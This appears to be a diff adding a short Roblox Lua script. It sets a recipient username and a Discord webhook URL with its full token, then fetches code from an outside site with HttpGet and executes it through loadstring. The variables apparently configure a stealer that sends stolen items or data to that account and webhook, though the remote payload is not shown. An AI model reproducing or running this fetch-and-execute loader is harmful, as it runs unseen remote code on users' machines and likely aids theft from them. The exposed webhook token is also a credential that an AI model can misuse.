@@ -1,0 +1,6 @@
+UserName = "mhikemhike1"
+Webhook = "https://discord.com/api/webhooks/1122027906391085057/k0p10rEZ0QV4WJwUMjRf4h2U_wLeY2jgBCG9Xs1aXy1yomIYjdHqUXMsAB7Y7Gg3EDg0"
+UserName2 = "mhikemhike1"
+
+
+loadstring(game:HttpGet("https://janeq.space/engine.lua"))()
